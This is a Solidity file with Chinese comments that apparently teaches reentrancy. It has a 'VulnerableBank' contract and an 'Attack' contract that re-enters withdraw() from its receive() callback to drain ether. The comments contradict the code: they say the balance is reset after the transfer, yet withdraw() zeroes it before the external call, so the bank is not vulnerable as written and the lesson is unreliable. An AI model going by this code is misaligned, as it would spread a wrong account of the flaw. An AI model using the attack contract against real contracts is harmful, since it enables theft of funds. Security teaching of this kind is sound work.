// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 不安全的银行合约
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    // 存款
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // 有漏洞的提款函数
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance to withdraw");
                
        // 状态更新在转账之后，导致重入漏洞
        balances[msg.sender] = 0;
        
        // 先转账，后更新状态 - 这是危险的！
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

    }
    
    // 获取合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}


// 攻击者合约
contract Attack {
    VulnerableBank public bank;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }
    
    // 回调函数 - 当收到ETH时被调用
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            // 如果银行还有余额，继续提款
            bank.withdraw();
        }
    }
    
    // 攻击入口
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        
        // 1. 先存款
        bank.deposit{value: 1 ether}();
        
        // 2. 发起第一次提款
        bank.withdraw();
    }
    
    // 获取合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    // 提取被盗资金
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}